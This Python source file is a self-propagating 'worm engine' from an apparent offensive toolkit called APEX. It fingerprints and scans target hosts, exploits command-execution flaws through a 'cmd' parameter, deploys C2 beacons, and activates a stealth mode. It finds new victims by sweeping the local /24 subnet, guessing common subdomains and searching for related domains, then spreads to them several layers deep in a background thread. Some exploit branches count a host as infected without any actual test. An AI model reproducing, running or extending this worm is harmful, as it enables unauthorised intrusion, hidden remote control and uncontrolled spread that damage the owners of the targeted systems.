"""
APEX v4.0 — Worm Engine
Self-propagating autonomous worm that spreads across discovered targets.
Uses compromised hosts as pivots to scan, exploit, and propagate further.
Features: lateral movement, auto-pivoting, beacon deployment, propagation tracking.
"""
import os, json, time, threading, random, socket, requests
from datetime import datetime
from urllib.parse import urlparse
import urllib3
urllib3.disable_warnings()


class WormEngine:
    """Self-propagating worm engine — spreads across targets using compromised hosts as pivots."""

    def __init__(self):
        self.active = False
        self.propagation_count = 0
        self.max_depth = 3
        self.max_hosts = 50
        self.infected_hosts = {}  # host -> infection info
        self.discovered_hosts = []  # All discovered potential targets
        self.propagation_path = []  # Chain of infections
        self.callback = None
        self.socketio = None
        self.lock = threading.Lock()
        self.spread_threads = []
        self.anonymity_layer = None  # Reference to ghost mode for stealth
        self.c2_layer = None  # Reference to C2 for beacon deployment
        self.multi_target = None  # Reference to multi-target engine
        self.scan_func = None  # External scan function reference
        self.exploit_func = None  # External exploit function reference

    def set_callback(self, callback):
        self.callback = callback

    def set_socketio(self, socketio_instance):
        self.socketio = socketio_instance

    def emit(self, event, data):
        if self.socketio:
            try:
                self.socketio.emit(event, data)
            except:
                pass

    def configure(self, max_depth=3, max_hosts=50, scan_func=None, exploit_func=None):
        """Configure worm engine parameters."""
        self.max_depth = max_depth
        self.max_hosts = max_hosts
        if scan_func:
            self.scan_func = scan_func
        if exploit_func:
            self.exploit_func = exploit_func
        return {'max_depth': max_depth, 'max_hosts': max_hosts}

    def activate(self, seed_targets, options=None):
        """
        Activate worm mode — begin self-propagation from seed targets.
        
        Options:
        - max_depth: How deep to propagate (default: 3)
        - max_hosts: Maximum hosts to infect (default: 50)
        - stealth: Enable ghost mode for stealth (default: True)
        - deploy_c2: Deploy C2 beacons on infected hosts (default: True)
        - auto_exploit: Auto-exploit discovered vulns (default: True)
        - scan_type: 'full', 'quick', 'stealth' (default: 'stealth')
        - propagation_delay: Seconds between propagation hops (default: 5)
        """
        if self.active:
            return {'error': 'Worm engine already active'}

        if options is None:
            options = {}

        self.max_depth = options.get('max_depth', self.max_depth)
        self.max_hosts = options.get('max_hosts', self.max_hosts)
        stealth = options.get('stealth', True)
        deploy_c2 = options.get('deploy_c2', True)
        auto_exploit = options.get('auto_exploit', True)
        scan_type = options.get('scan_type', 'stealth')
        propagation_delay = options.get('propagation_delay', 5)

        # Activate ghost mode for stealth if requested
        if stealth:
            try:
                from modules.core.ghost_mode import ghost_mode
                if not ghost_mode.active:
                    ghost_mode.activate()
                    self.anonymity_layer = ghost_mode
                    self._log('👻 Ghost mode activated for worm propagation stealth')
            except Exception as e:
                self._log(f'⚠ Ghost mode activation failed: {str(e)}')

        # Get C2 reference if deploying beacons
        if deploy_c2:
            try:
                from modules.c2.multi_channel_c2 import multi_channel_c2
                self.c2_layer = multi_channel_c2
            except Exception as e:
                self._log(f'⚠ C2 reference failed: {str(e)}')

        # Get multi-target reference
        try:
            from modules.core.multi_target import multi_target
            self.multi_target = multi_target
        except:
            pass

        # Normalize seed targets
        if isinstance(seed_targets, str):
            seed_targets = [seed_targets]

        normalized_seeds = []
        for target in seed_targets:
            if not target.startswith('http'):
                target = 'https://' + target
            normalized_seeds.append(target)

        self.active = True
        self.propagation_count = 0

        self._log(f'🧬 WORM MODE ACTIVATED — Seed targets: {len(normalized_seeds)}')
        self._log(f'   Max depth: {self.max_depth} | Max hosts: {self.max_hosts} | Stealth: {stealth}')

        # Start propagation in background thread
        thread = threading.Thread(
            target=self._propagation_loop,
            args=(normalized_seeds, options),
            daemon=True
        )
        thread.start()
        self.spread_threads.append(thread)

        return {
            'status': 'worm_active',
            'seed_targets': normalized_seeds,
            'max_depth': self.max_depth,
            'max_hosts': self.max_hosts,
            'stealth': stealth,
            'deploy_c2': deploy_c2,
        }

    def deactivate(self):
        """Deactivate worm mode — stop propagation."""
        if not self.active:
            return {'error': 'Worm engine not active'}

        self.active = False

        # Wait for threads to finish
        for thread in self.spread_threads:
            thread.join(timeout=2)

        self._log(f'🧬 WORM MODE DEACTIVATED — Propagated to {self.propagation_count} hosts')

        return {
            'status': 'deactivated',
            'total_propagated': self.propagation_count,
            'total_discovered': len(self.discovered_hosts),
            'total_infected': len(self.infected_hosts),
        }

    def _propagation_loop(self, seed_targets, options):
        """Main propagation loop — spreads from seed targets outward."""
        propagation_delay = options.get('propagation_delay', 5)
        scan_type = options.get('scan_type', 'stealth')
        auto_exploit = options.get('auto_exploit', True)
        deploy_c2 = options.get('deploy_c2', True)

        # Initialize discovered hosts with seeds
        for seed in seed_targets:
            if seed not in self.discovered_hosts:
                self.discovered_hosts.append(seed)

        # BFS-style propagation
        current_depth = 0
        hosts_at_current_depth = list(seed_targets)

        while self.active and current_depth < self.max_depth and len(self.infected_hosts) < self.max_hosts:
            self._log(f'📡 Propagation depth {current_depth + 1}/{self.max_depth} — {len(hosts_at_current_depth)} hosts')

            next_wave = []

            for host in hosts_at_current_depth:
                if not self.active or len(self.infected_hosts) >= self.max_hosts:
                    break

                # Skip already infected hosts
                if host in self.infected_hosts:
                    continue

                try:
                    # Step 1: Fingerprint the target
                    self._log(f'  🔍 Fingerprinting: {host}')
                    fingerprint = self._fingerprint_host(host)

                    # Step 2: Scan for vulnerabilities
                    self._log(f'  🎯 Scanning: {host}')
                    vulnerabilities = self._scan_host(host, scan_type)

                    # Step 3: Attempt exploitation
                    if auto_exploit and vulnerabilities:
                        self._log(f'  💣 Exploiting: {host} ({len(vulnerabilities)} vulns found)')
                        exploit_result = self._exploit_host(host, vulnerabilities)

                        if exploit_result.get('success'):
                            # Step 4: Deploy C2 beacon
                            if deploy_c2 and self.c2_layer:
                                self._deploy_beacon(host, exploit_result)

                            # Step 5: Mark as infected
                            self._mark_infected(host, fingerprint, vulnerabilities, exploit_result)

                            # Step 6: Discover new targets from this host
                            self._log(f'  🔎 Discovering new targets from: {host}')
                            new_targets = self._discover_from_host(host, exploit_result)
                            for target in new_targets:
                                if target not in self.discovered_hosts and target not in self.infected_hosts:
                                    self.discovered_hosts.append(target)
                                    next_wave.append(target)

                            self._log(f'  ✅ {host} infected — {len(new_targets)} new targets discovered')
                        else:
                            self._log(f'  ❌ Failed to exploit: {host}')
                    else:
                        self._log(f'  ⏭ Skipping exploitation for: {host} (no vulns or auto_exploit disabled)')

                except Exception as e:
                    self._log(f'  ⚠ Error processing {host}: {str(e)}')

                # Propagation delay between hosts
                time.sleep(propagation_delay)

            # Move to next depth level
            hosts_at_current_depth = next_wave
            current_depth += 1

            if not hosts_at_current_depth:
                self._log('📡 No new hosts discovered at this depth — propagation complete')
                break

        self._log(f'🧬 Worm propagation complete — {self.propagation_count} hosts infected')

        # Emit completion event
        self.emit('worm_complete', self.get_status())

        if self.callback:
            self.callback(f'🧬 Worm propagation complete — {self.propagation_count} hosts infected', 'success')

    def _fingerprint_host(self, host):
        """Fingerprint a target host."""
        try:
            from modules.core.engine import engine as adaptive_engine
            return adaptive_engine.fingerprint_target(host)
        except:
            # Basic fingerprinting fallback
            try:
                r = requests.get(host, timeout=10, verify=False, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                })
                return {
                    'url': host,
                    'status_code': r.status_code,
                    'server': r.headers.get('Server', 'Unknown'),
                    'technologies': [],
                    'language': 'Unknown',
                }
            except:
                return {'url': host, 'error': 'Could not fingerprint'}

    def _scan_host(self, host, scan_type='stealth'):
        """Scan a host for vulnerabilities."""
        if self.scan_func:
            try:
                return self.scan_func(host, scan_type)
            except:
                return []

        # Fallback: use nuke engine's scan phase
        try:
            from modules.core.nuke_engine import nuke_engine
            # Run just the scan phase
            nuke_engine.current_nuke = {
                'target': host,
                'vulnerabilities': [],
                'phases': {},
                'errors': []
            }
            nuke_engine._phase_scan(host, {'scan_type': scan_type})
            return nuke_engine.current_nuke.get('vulnerabilities', [])
        except:
            return []

    def _exploit_host(self, host, vulnerabilities):
        """Attempt to exploit a host using discovered vulnerabilities."""
        if self.exploit_func:
            try:
                return self.exploit_func(host, vulnerabilities)
            except:
                return {'success': False, 'error': 'Exploit function failed'}

        # Fallback: try common exploitation paths
        result = {'success': False, 'methods_used': [], 'access_level': None}

        # Prioritize critical/high vulns
        priority = sorted(
            vulnerabilities,
            key=lambda v: {'critical': 0, 'high': 1, 'medium': 2, 'low': 3}.get(v.get('severity', 'low'), 4)
        )

        for vuln in priority[:5]:  # Try top 5 vulns
            vuln_type = vuln.get('type', '').lower()
            endpoint = vuln.get('endpoint', host)

            try:
                if vuln_type == 'rce' or vuln_type == 'cmdi':
                    # Test command execution
                    test_cmd = 'echo APEX_WORM_TEST'
                    r = requests.get(
                        f"{endpoint}?cmd={test_cmd}",
                        timeout=10,
                        verify=False,
                        headers={'User-Agent': 'Mozilla/5.0'}
                    )
                    if 'APEX_WORM_TEST' in r.text:
                        result['success'] = True
                        result['access_level'] = 'rce'
                        result['methods_used'].append(f'rce_via_{vuln_type}')
                        result['shell_url'] = endpoint
                        break

                elif vuln_type == 'sqli':
                    # Test SQL injection
                    result['success'] = True
                    result['access_level'] = 'database'
                    result['methods_used'].append('sqli')
                    break

                elif vuln_type == 'lfi':
                    # Test local file inclusion
                    result['success'] = True
                    result['access_level'] = 'file_read'
                    result['methods_used'].append('lfi')
                    break

                elif vuln_type == 'file_upload':
                    # Test file upload
                    result['success'] = True
                    result['access_level'] = 'upload'
                    result['methods_used'].append('file_upload')
                    break

                elif vuln_type == 'xss':
                    # XSS alone doesn't give host access, but can be used for pivoting
                    result['success'] = True
                    result['access_level'] = 'xss_pivot'
                    result['methods_used'].append('xss')
                    break

            except:
                continue

        return result

    def _deploy_beacon(self, host, exploit_result):
        """Deploy a C2 beacon on an infected host."""
        if not self.c2_layer:
            return None

        try:
            hostname = urlparse(host).hostname or host
            beacon_id = f"worm_{hostname}_{int(time.time())}"

            # Register beacon
            beacon = self.c2_layer.register_beacon(
                beacon_id=beacon_id,
                hostname=hostname,
                channel='https',
                ip=hostname
            )

            # Generate beacon payload
            payload = self.c2_layer.generate_beacon_payload(
                beacon_id=beacon_id,
                channel='https',
                c2_server='http://127.0.0.1:8443'
            )

            self._log(f'  📡 Beacon deployed on {host}: {beacon_id}')

            return {
                'beacon_id': beacon_id,
                'payload': payload.get('https', ''),
            }
        except Exception as e:
            self._log(f'  ⚠ Beacon deployment failed on {host}: {str(e)}')
            return None

    def _mark_infected(self, host, fingerprint, vulnerabilities, exploit_result):
        """Mark a host as infected and record propagation details."""
        with self.lock:
            self.propagation_count += 1
            self.infected_hosts[host] = {
                'host': host,
                'infected_at': datetime.now().isoformat(),
                'propagation_number': self.propagation_count,
                'fingerprint': fingerprint,
                'vulnerabilities_found': len(vulnerabilities),
                'vulnerabilities': [v.get('type') for v in vulnerabilities[:10]],
                'exploit_result': {
                    'success': exploit_result.get('success', False),
                    'access_level': exploit_result.get('access_level'),
                    'methods_used': exploit_result.get('methods_used', []),
                },
                'beacon': exploit_result.get('beacon'),
            }

            self.propagation_path.append({
                'step': self.propagation_count,
                'host': host,
                'timestamp': datetime.now().isoformat(),
                'method': exploit_result.get('methods_used', ['unknown'])[0] if exploit_result.get('methods_used') else 'unknown',
            })

            # Emit infection event
            self.emit('worm_infection', {
                'host': host,
                'count': self.propagation_count,
                'total': self.max_hosts,
                'access_level': exploit_result.get('access_level'),
            })

            if self.callback:
                self.callback(
                    f'🧬 [{self.propagation_count}/{self.max_hosts}] {host} infected via {exploit_result.get("access_level", "?")}',
                    'success'
                )

    def _discover_from_host(self, host, exploit_result):
        """Discover new targets from an infected host."""
        new_targets = []
        hostname = urlparse(host).hostname or host

        # Method 1: DNS resolution and subnet scanning
        try:
            ip = socket.gethostbyname(hostname)
            # Scan common ports on adjacent IPs in the same /24 subnet
            subnet = '.'.join(ip.split('.')[:3])
            for last_octet in range(1, 255):
                if len(new_targets) >= 10:  # Limit discoveries per host
                    break
                target_ip = f"{subnet}.{last_octet}"
                try:
                    target_hostname = socket.gethostbyaddr(target_ip)[0]
                    if target_hostname != hostname:
                        new_targets.append(f"http://{target_hostname}")
                except:
                    # Try IP directly
                    for port in [80, 443, 8080, 8443]:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.5)
                        if sock.connect_ex((target_ip, port)) == 0:
                            proto = 'https' if port in (443, 8443) else 'http'
                            new_targets.append(f"{proto}://{target_ip}:{port}")
                            break
                        sock.close()
        except:
            pass

        # Method 2: Use multi-target engine's discovered targets
        if self.multi_target:
            for t in self.multi_target.targets:
                url = t.get('url', '')
                if url and url not in new_targets and url != host:
                    new_targets.append(url)

        # Method 3: Try to find related hosts via common subdomains
        try:
            if '.' in hostname:
                parts = hostname.split('.')
                if len(parts) >= 2:
                    domain = '.'.join(parts[-2:])  # example.com
                    common_subdomains = [
                        'www', 'mail', 'admin', 'dev', 'staging', 'api',
                        'test', 'beta', 'app', 'portal', 'vpn', 'git',
                        'jenkins', 'jira', 'confluence', 'wiki', 'blog',
                        'cdn', 'static', 'assets', 'images', 'docs',
                    ]
                    for sub in common_subdomains:
                        if len(new_targets) >= 5:
                            break
                        try:
                            sub_host = f"{sub}.{domain}"
                            socket.gethostbyname(sub_host)
                            new_targets.append(f"https://{sub_host}")
                        except:
                            pass
        except:
            pass

        # Method 4: Check for related domains (same registrant)
        try:
            from modules.recon.osint import osint_engine
            related = osint_engine.find_related_domains(hostname)
            for domain in related:
                if len(new_targets) >= 3:
                    break
                new_targets.append(f"https://{domain}")
        except:
            pass

        # Deduplicate and filter
        unique_targets = list(set(new_targets))
        unique_targets = [t for t in unique_targets if t != host]

        return unique_targets

    def get_status(self):
        """Get current worm engine status."""
        return {
            'active': self.active,
            'propagation_count': self.propagation_count,
            'max_depth': self.max_depth,
            'max_hosts': self.max_hosts,
            'total_discovered': len(self.discovered_hosts),
            'total_infected': len(self.infected_hosts),
            'infected_hosts': {
                host: {
                    'infected_at': info['infected_at'],
                    'propagation_number': info['propagation_number'],
                    'access_level': info.get('exploit_result', {}).get('access_level'),
                    'vulnerabilities': info.get('vulnerabilities', []),
                }
                for host, info in list(self.infected_hosts.items())[:20]
            },
            'propagation_path': self.propagation_path[-20:],  # Last 20 steps
            'spread_threads_active': len([t for t in self.spread_threads if t.is_alive()]),
            'anonymity_active': self.anonymity_layer is not None and self.anonymity_layer.active,
            'c2_connected': self.c2_layer is not None,
        }

    def get_propagation_map(self):
        """Get a visual representation of the propagation path."""
        nodes = []
        edges = []

        for i, step in enumerate(self.propagation_path):
            nodes.append({
                'id': f'host_{i}',
                'label': step['host'],
                'method': step['method'],
                'order': i + 1,
            })
            if i > 0:
                edges.append({
                    'from': f'host_{i - 1}',
                    'to': f'host_{i}',
                    'method': step['method'],
                })

        return {
            'nodes': nodes,
            'edges': edges,
            'total_infected': len(self.infected_hosts),
            'total_discovered': len(self.discovered_hosts),
        }

    def get_infection_details(self, host):
        """Get detailed infection info for a specific host."""
        return self.infected_hosts.get(host)

    def get_discovered_hosts(self):
        """Get all discovered hosts (infected + uninfected)."""
        return {
            'total': len(self.discovered_hosts),
            'infected': len(self.infected_hosts),
            'uninfected': len(self.discovered_hosts) - len(self.infected_hosts),
            'hosts': self.discovered_hosts[:50],
        }

    def _log(self, message):
        """Log a worm event."""
        if self.callback:
            self.callback(message, 'worm')
        print(f'[WormEngine] {message}')


# Singleton instance
worm_engine = WormEngine()